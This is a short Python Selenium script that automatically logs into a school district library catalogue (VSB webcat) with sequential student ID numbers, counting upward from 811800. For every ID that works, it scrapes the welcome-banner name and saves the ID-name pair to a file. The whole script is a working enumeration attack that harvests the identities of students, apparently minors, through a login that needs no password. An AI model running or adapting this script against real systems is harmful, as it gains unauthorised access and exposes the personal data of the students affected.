#!/usr/bin/python
# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

studentID = 811800
MASTER_URL = "http://webcat.vsb.bc.ca/ipac20/ipac.jsp?session=&profile=ls&auth=false&submenu=subtab13&date="
driver = webdriver.Firefox()
driver.get(MASTER_URL)
studentIdList = open('student-id-list', 'w')
nonStudentIdList = open('non-student-id-list', 'w')


def waitForPageToLoad():
	time.sleep(1)

def writeToFile(studentName, studentID, file):
	studentName = str(studentName)
	studentID = str(studentID)

	if file == 'student-id-list':
		studentIdList.write(studentID +  studentName + '\n')

	if file == 'non-student-id-list':
		nonStudentIdList.write(studentID + '\n')

def logout():
	waitForPageToLoad()
	# globalAnchor is the logout button
	logout = driver.find_element_by_class_name("globalAnchor")
	# click it
	logout.send_keys(Keys.RETURN)
	# go back to home page
	driver.get(MASTER_URL)

def login():
	# make sure we are on correct page
	assert "VSB webcat" in driver.title

	# find login field
	elem = driver.find_element_by_name("sec1")
	elem.clear()
	elem.send_keys(studentID)
	print(studentID)
	elem.send_keys(Keys.RETURN)

def getLoggedInName():
	waitForPageToLoad()

	name = driver.find_element_by_xpath("//td[@title='Name']")
	loggedInName = name.get_attribute('innerHTML')

	username = loggedInName.replace("Welcome ", "")
	username = username.replace("&nbsp;", " ")
	print(username)

	writeToFile(username, studentID, 'student-id-list')


while True:
	try: 
		login()
		getLoggedInName()
		logout()

	except: 
		writeToFile('', studentID, 'non-student-id-list')
		logout()

	studentID += 1